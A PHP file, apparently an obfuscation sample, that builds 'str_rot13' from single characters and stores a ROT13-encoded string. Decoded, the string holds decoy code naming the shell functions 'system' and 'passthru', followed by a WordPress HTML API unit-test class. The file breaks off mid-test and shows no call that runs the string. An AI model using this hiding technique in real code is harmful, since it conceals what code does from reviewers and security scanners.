<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_UGZY_Gnt_Cebprffbe gbxra-fpnaavat shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc ugzy-ncv
 *
 * @pbirefQrsnhygPynff JC_UGZY_Gnt_Cebprffbe
 */
pynff Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rafherf gung fpnaavat svavfurf va n pbzcyrgr sbez jura gur qbphzrag vf rzcgl.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_pbzcyrgrf_rzcgl_qbphzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '' );

		$guvf->nffregSnyfr(
			$cebprffbe->arkg_gbxra(),
			\"Fubhyq abg unir sbhaq nal gbxraf ohg sbhaq {$cebprffbe->trg_gbxra_glcr()}.\"
		);
	}

	/**
	 * Rafherf gung abezngvir grkg abqrf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_grkg_abqr() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( 'Uryyb, Jbeyq!' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq #grkg gbxra glcr ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'Uryyb, Jbeyq!',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung `trg_zbqvsvnoyr_grkg()` cebcreyl genafsbezf grkg pbagrag.
	 *
	 * Gur arjyvar naq AHYY olgr (H+0000) orunivbef pna or pbzcyvpngrq fvapr gurl qrcraq
	 * ba jurer gur olgrf jrer sbhaq naq jurgure gurl jrer enj olgrf va gur vachg fgernz
	 * be qrpbqrq sebz punenpgre ersreraprf.
	 *
	 * @gvpxrg 61576
	 *
	 * @qngnCebivqre qngn_zbqvsvnoyr_grkg_arrqvat_genafsbezngvba
	 *
	 * @cnenz fgevat $ugzy_jvgu_gnetrg_abqr    UGZY jvgu abqr pbagnvavat `gnetrg` be `gnetrg-arkg` nggevohgr.
	 * @cnenz fgevat $rkcrpgrq_zbqvsvnoyr_grkg Rkcrpgrq zbqvsvnoyr grkg sebz gnetrg abqr be sbyybjvat abqr.
	 */
	choyvp shapgvba grfg_zbqvsvnoyr_grkg_cebcre_genafsbezf( fgevat $ugzy_jvgu_gnetrg_abqr, fgevat $rkcrpgrq_zbqvsvnoyr_grkg ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy_jvgu_gnetrg_abqr );

		// Svaq gur rkcrpgrq gnetrg abqr.
		juvyr ( $cebprffbe->arkg_gbxra() ) {
			$gnetrg = $cebprffbe->trg_nggevohgr( 'gnetrg' );
			vs ( gehr === $gnetrg ) {
				oernx;
			}

			vs ( vf_ahzrevp( $gnetrg ) ) {
				sbe ( $v = (vag) $gnetrg; $v > 0; $v-- ) {
					$cebprffbe->arkg_gbxra();
				}
				oernx;
			}
		}

		$guvf->nffregFnzr(
			$rkcrpgrq_zbqvsvnoyr_grkg,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			\"Fubhyq unir cebcreyl qrpbqrq naq genafsbezrq zbqvsvnoyr grkg, ohg qvqa'g.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_zbqvsvnoyr_grkg_arrqvat_genafsbezngvba() {
		erghea neenl(
			'Grkg abqr + AHYY olgr'      => neenl( \"<fcna gnetrg=1>AHYY olgr va \k00 grkg abqrf qvfnccrnef.\", 'AHYY olgr va  grkg abqrf qvfnccrnef.' ),
			'YVFGVAT + arjyvar'          => neenl( \"<yvfgvat gnetrg=1>\aAb arjyvar</yvfgvat>\", 'Ab arjyvar' ),
			'YVFGVAT + PE + YS'          => neenl( \"<yvfgvat gnetrg=1>\e\aAb arjyvar</yvfgvat>\", 'Ab arjyvar' ),
			'YVFGVAT + Rapbqrq YS'       => neenl( '<yvfgvat gnetrg=1>&#k0n;Ab arjyvar</yvfgvat>', 'Ab arjyvar' ),
			'YVFGVAT + Rapbqrq PE'       => neenl( '<yvfgvat gnetrg=1>&#k0q;Arjyvar</yvfgvat>', \"\eArjyvar\" ),
			'YVFGVAT + Rapbqrq PE + YS'  => neenl( '<yvfgvat gnetrg=1>&#k0q;&#k0n;Arjyvar</yvfgvat>', \"\e\aArjyvar\" ),
			'CER + arjyvar'              => neenl( \"<cer gnetrg=1>\aAb arjyvar</cer>\", 'Ab arjyvar' ),
			'CER + PE + YS'              => neenl( \"<cer gnetrg=1>\e\aAb arjyvar</cer>\", 'Ab arjyvar' ),
			'CER + Rapbqrq YS'           => neenl( '<cer gnetrg=1>&#k0n;Ab arjyvar</cer>', 'Ab arjyvar' ),
			'CER + Rapbqrq PE'           => neenl( '<cer gnetrg=1>&#k0q;Arjyvar</cer>', \"\eArjyvar\" ),
			'CER + Rapbqrq PE + YS'      => neenl( '<cer gnetrg=1>&#k0q;&#k0n;Arjyvar</cer>', \"\e\aArjyvar\" ),
			'GRKGNERN + arjyvar'         => neenl( \"<grkgnern gnetrg>\aAb arjyvar</grkgnern>\", 'Ab arjyvar' ),
			'GRKGNERN + PE + YS'         => neenl( \"<grkgnern gnetrg>\e\aAb arjyvar</grkgnern>\", 'Ab arjyvar' ),
			'GRKGNERN + Rapbqrq YS'      => neenl( '<grkgnern gnetrg>&#k0n;Ab arjyvar</grkgnern>', 'Ab arjyvar' ),
			'GRKGNERN + Rapbqrq PE'      => neenl( '<grkgnern gnetrg>&#k0q;Arjyvar</grkgnern>', \"\eArjyvar\" ),
			'GRKGNERN + Rapbqrq PE + YS' => neenl( '<grkgnern gnetrg>&#k0q;&#k0n;Arjyvar</grkgnern>', \"\e\aArjyvar\" ),
			'GRKGNERN + Pbzzrag-yvxr'    => neenl( \"<grkgnern gnetrg><!-- pbzzrag -->\aAb arjyvar</grkgnern>\", \"<!-- pbzzrag -->\aAb arjyvar\" ),
			'CER + Pbzzrag'              => neenl( \"<cer gnetrg=2><!-- pbzzrag -->\aAb arjyvar</cer>\", \"\aAb arjyvar\" ),
			'CER + PQNGN-yvxr'           => neenl( \"<cer gnetrg=2><![PQNGN[grfg]]>\aAb arjyvar</cer>\", \"\aAb arjyvar\" ),
			'YVFGVAT + AHYY olgr'        => neenl( \"<yvfgvat gnetrg=1>\k00 vf zvffvat</yvfgvat>\", ' vf zvffvat' ),
			'CER + AHYY olgr'            => neenl( \"<cer gnetrg=1>\k00 vf zvffvat</cer>\", ' vf zvffvat' ),
			'GRKGNERN + AHYY olgr'       => neenl( \"<grkgnern gnetrg>\k00 vf H+SSSQ</grkgnern>\", \"\h{SSSQ} vf H+SSSQ\" ),
			'FPEVCG + AHYY olgr'         => neenl( \"<fpevcg gnetrg>\k00 vf H+SSSQ</fpevcg>\", \"\h{SSSQ} vf H+SSSQ\" ),
			'rfp(FPEVCG) + AHYY olgr'    => neenl( \"<fpevcg gnetrg><!-- <fpevcg> \k00 </fpevcg> --> vf H+SSSQ</fpevcg>\", \"<!-- <fpevcg> \h{SSSQ} </fpevcg> --> vf H+SSSQ\" ),
			'FGLYR + AHYY olgr'          => neenl( \"<fglyr gnetrg>\k00 vf H+SSSQ</fglyr>\", \"\h{SSSQ} vf H+SSSQ\" ),
			'KZC + AHYY olgr'            => neenl( \"<kzc gnetrg>\k00 vf H+SSSQ</kzc>\", \"\h{SSSQ} vf H+SSSQ\" ),
			'PQNGN-yvxr + AHYY olgr'     => neenl( \"<fcna gnetrg=1><![PQNGN[whfg n \k00pbzzrag]]>\", \"whfg n \h{SSSQ}pbzzrag\" ),
			'Shaxl pbzzrag + AHYY olgr'  => neenl( \"<fcna gnetrg=1></%whfg n \k00pbzzrag>\", \"%whfg n \h{SSSQ}pbzzrag\" ),
		);
	}

	/**
	 * Rafherf gung abezngvir Ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_ryrzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<qvi vq=\"grfg\" vareg>Uryyb, Jbeyq!</qvi>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'QVI',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq QVI gnt anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'grfg',
			$cebprffbe->trg_nggevohgr( 'vq' ),
			\"Fubhyq unir sbhaq vq nggevohgr inyhr 'grfg' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'vq' )} vafgrnq.\"
		);

		$guvf->nffregGehr(
			$cebprffbe->trg_nggevohgr( 'vareg' ),
			\"Fubhyq unir sbhaq obbyrna nggevohgr 'vareg' ohg qvqa'g.\"
		);

		$nggevohgrf     = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		$nggevohgr_yvfg = neenl_znc( 'Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat::dhbgrq', $nggevohgrf );
		$guvf->nffregFnzr(
			neenl( 'vq', 'vareg' ),
			$nggevohgrf,
			'Fubhyq unir sbhaq bayl gjb nggevohgrf ohg sbhaq ' . vzcybqr( ', ', $nggevohgr_yvfg ) . ' vafgrnq.'
		);

		$guvf->nffregFnzr(
			'',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			\"Fubhyq unir sbhaq rzcgl zbqvsvnoyr grkg ohg sbhaq '{$cebprffbe->trg_zbqvsvnoyr_grkg()}' vafgrnq.\"
		);
	}

	/**
	 * Rafherf gung abezngvir FPEVCG ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_fpevcg_ryrzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fpevcg glcr=\"zbqhyr\">pbafbyr.ybt( \"Uryyb, Jbeyq!\" );</fpevcg>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'FPEVCG',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq FPEVCG gnt anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'zbqhyr',
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			\"Fubhyq unir sbhaq glcr nggevohgr inyhr 'zbqhyr' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'glcr' )} vafgrnq.\"
		);

		$nggevohgrf     = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		$nggevohgr_yvfg = neenl_znc( 'Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat::dhbgrq', $nggevohgrf );
		$guvf->nffregFnzr(
			neenl( 'glcr' ),
			$nggevohgrf,
			\"Fubhyq unir sbhaq fvatyr 'glcr' nggevohgr ohg sbhaq \" . vzcybqr( ', ', $nggevohgr_yvfg ) . ' vafgrnq.'
		);

		$guvf->nffregFnzr(
			'pbafbyr.ybt( \"Uryyb, Jbeyq!\" );',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir GRKGNERN ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_grkgnern_ryrzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe(
			<<<UGZY
<grkgnern ebjf=30 pbyf=\"80\">
Vf <UGZY> &tg; KUGZY?
</grkgnern>
UGZY
		);
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'GRKGNERN',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq GRKGNERN gnt anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'30',
			$cebprffbe->trg_nggevohgr( 'ebjf' ),
			\"Fubhyq unir sbhaq ebjf nggevohgr inyhr 'zbqhyr' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'ebjf' )} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'80',
			$cebprffbe->trg_nggevohgr( 'pbyf' ),
			\"Fubhyq unir sbhaq pbyf nggevohgr inyhr 'zbqhyr' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'pbyf' )} vafgrnq.\"
		);

		$nggevohgrf     = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		$nggevohgr_yvfg = neenl_znc( 'Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat::dhbgrq', $nggevohgrf );
		$guvf->nffregFnzr(
			neenl( 'ebjf', 'pbyf' ),
			$nggevohgrf,
			'Fubhyq unir sbhaq bayl gjb nggevohgrf ohg sbhaq ' . vzcybqr( ', ', $nggevohgr_yvfg ) . ' vafgrnq.'
		);

		// Abgr gung gur yrnqvat arjyvar fubhyq or erzbirq sebz gur GRKGNERN pbagragf.
		$guvf->nffregFnzr(
			\"Vf <UGZY> > KUGZY?\a\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir GVGYR ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_gvgyr_ryrzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe(
			<<<UGZY
<gvgyr pynff=\"zhygv-yvar-gvgyr\">
Vf <UGZY> &tg; KUGZY?
</gvgyr>
UGZY
		);
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'GVGYR',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq GVGYR gnt anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'zhygv-yvar-gvgyr',
			$cebprffbe->trg_nggevohgr( 'pynff' ),
			\"Fubhyq unir sbhaq pynff nggevohgr inyhr 'zhygv-yvar-gvgyr' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'ebjf' )} vafgrnq.\"
		);

		$nggevohgrf     = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		$nggevohgr_yvfg = neenl_znc( 'Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat::dhbgrq', $nggevohgrf );
		$guvf->nffregFnzr(
			neenl( 'pynff' ),
			$nggevohgrf,
			'Fubhyq unir sbhaq bayl bar nggevohgr ohg sbhaq ' . vzcybqr( ', ', $nggevohgr_yvfg ) . ' vafgrnq.'
		);

		$guvf->nffregFnzr(
			\"\aVf <UGZY> > KUGZY?\a\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir ENJGRKG ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 *
	 * @qngnCebivqre qngn_enjgrkg_ryrzragf
	 *
	 * @cnenz fgevat $gnt_anzr Gur anzr bs gur ENJGRKG gnt gb grfg.
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_enjgrkg_ryrzragf( $gnt_anzr ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe(
			<<<UGZY
<{$gnt_anzr} pynff=\"zhygv-yvar-gvgyr\">
Vf <UGZY> &tg; KUGZY?
</{$gnt_anzr}>
UGZY
		);
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			$gnt_anzr,
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq {$gnt_anzr} gnt anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'zhygv-yvar-gvgyr',
			$cebprffbe->trg_nggevohgr( 'pynff' ),
			\"Fubhyq unir sbhaq pynff nggevohgr inyhr 'zhygv-yvar-gvgyr' ohg sbhaq {$cebprffbe->trg_nggevohgr( 'ebjf' )} vafgrnq.\"
		);

		$nggevohgrf     = $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
		$nggevohgr_yvfg = neenl_znc( 'Grfgf_UgzyNcv_JcUgzyCebprffbe_Gbxra_Fpnaavat::dhbgrq', $nggevohgrf );
		$guvf->nffregFnzr(
			neenl( 'pynff' ),
			$nggevohgrf,
			'Fubhyq unir sbhaq bayl bar nggevohgr ohg sbhaq ' . vzcybqr( ', ', $nggevohgr_yvfg ) . ' vafgrnq.'
		);

		$guvf->nffregFnzr(
			\"\aVf <UGZY> &tg; KUGZY?\a\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_enjgrkg_ryrzragf() {
		erghea neenl(
			'VSENZR'   => neenl( 'VSENZR' ),
			'ABRZORQ'  => neenl( 'ABRZORQ' ),
			'ABSENZRF' => neenl( 'ABSENZRF' ),
			'FGLYR'    => neenl( 'FGLYR' ),
			'KZC'      => neenl( 'KZC' ),
		);
	}

	/**
	 * Rafherf gung abezngvir PQNGN frpgvbaf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_pqngn_frpgvba() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<![PQNGN[guvf vf n pbzzrag]]>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq pbzzrag gbxra ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			JC_UGZY_Cebprffbe::PBZZRAG_NF_PQNGN_YBBXNYVXR,
			$cebprffbe->trg_pbzzrag_glcr(),
			'Fubhyq unir qrgrpgrq n PQNGN-yvxr vainyvq pbzzrag.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'guvf vf n pbzzrag',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir PQNGN frpgvbaf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60406
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_pqngn_pbzzrag_jvgu_vapbeerpg_pybfre() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<![PQNGN[guvf vf zvffvat n pybfvat fdhner oenpxrg]>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq pbzzrag gbxra ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			JC_UGZY_Cebprffbe::PBZZRAG_NF_VAINYVQ_UGZY,
			$cebprffbe->trg_pbzzrag_glcr(),
			'Fubhyq unir qrgrpgrq vainyvq UGZY pbzzrag.'
		);

		$guvf->nffregFnzr(
			'[PQNGN[guvf vf zvffvat n pybfvat fdhner oenpxrg]',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung noehcgyl-pybfrq PQNGN frpgvbaf ner cebcreyl cnefrq nf pbzzragf.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_noehcgyl_pybfrq_pqngn_frpgvba() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<![PQNGN[guvf vf > n pbzzrag]]>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq n obthf pbzzrag ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			JC_UGZY_Cebprffbe::PBZZRAG_NF_VAINYVQ_UGZY,
			$cebprffbe->trg_pbzzrag_glcr(),
			'Fubhyq unir qrgrpgrq vainyvq UGZY pbzzrag.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'[PQNGN[guvf vf ',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);

		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq grkg abqr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			' n pbzzrag]]>',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq erznvavat flagnk sebz noehcgyl-pybfrq PQNGN frpgvba.'
		);
	}

	/**
	 * Rafherf gung onfvp PQNGN frpgvbaf vafvqr sbervta pbagrag ner qrgrpgrq.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_onfvp_pqngn_va_sbervta_pbagrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fit><![PQNGN[guvf vf >&tg; erny PQNGN]]></fit>' );
		$cebprffbe->arkg_gbxra();

		// Negvsvpvnyyl punatr anzrfcnpr; guvf fubhyq or qbar va gur UGZY Cebprffbe.
		$cebprffbe->punatr_cnefvat_anzrfcnpr( 'fit' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pqngn-frpgvba',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq n PQNGN frpgvba ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'guvf vf >&tg; erny PQNGN',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung rzcgl PQNGN frpgvbaf vafvqr sbervta pbagrag ner qrgrpgrq.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_rzcgl_pqngn_va_sbervta_pbagrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fit><![PQNGN[]]></fit>' );
		$cebprffbe->arkg_gbxra();

		// Negvsvpvnyyl punatr anzrfcnpr; guvf fubhyq or qbar va gur UGZY Cebprffbe.
		$cebprffbe->punatr_cnefvat_anzrfcnpr( 'fit' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pqngn-frpgvba',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq n PQNGN frpgvba ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregRzcgl(
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq aba-rzcgl zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir Cebprffvat Vafgehpgvba abqrf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_cebprffvat_vafgehpgvba() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<?jc-ovg {\"whfg\": \"xvqqvat\"}?>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq pbzzrag gbxra ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			JC_UGZY_Cebprffbe::PBZZRAG_NF_CV_ABQR_YBBXNYVXR,
			$cebprffbe->trg_pbzzrag_glcr(),
			'Fubhyq unir qrgrpgrq n Cebprffvat Vafgehpgvba-yvxr vainyvq pbzzrag.'
		);

		$guvf->nffregFnzr(
			'jc-ovg',
			$cebprffbe->trg_gnt(),
			\"Fubhyq unir sbhaq CV gnetrg nf gnt anzr ohg sbhaq {$cebprffbe->trg_gnt()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			' {\"whfg\": \"xvqqvat\"}',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung noehcgyl-pybfrq Cebprffvat Vafgehpgvba abqrf ner cebcreyl cnefrq nf pbzzragf.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_noehcgyl_pybfrq_cebprffvat_vafgehpgvba() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<?irefvba=\">=5.3.6\"?>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq obthf pbzzrag ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq #pbzzrag nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'irefvba=\"',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);

		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
